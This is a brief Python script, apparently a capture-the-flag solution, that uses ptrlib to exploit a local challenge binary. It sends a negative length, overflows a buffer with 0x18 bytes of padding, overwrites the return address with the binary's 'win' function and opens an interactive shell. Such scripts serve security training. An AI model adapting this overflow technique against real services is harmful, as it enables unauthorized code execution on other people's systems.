from ptrlib import *

elf = ELF("../distfiles/chall")
#sock = Process("../distfiles/chall")
sock = Socket("localhost", 9992)

sock.sendlineafter(": ", "-16")
payload  = b"A"*0x18
payload += p64(elf.symbol("win"))
sock.sendlineafter(": ", payload)

sock.sh()
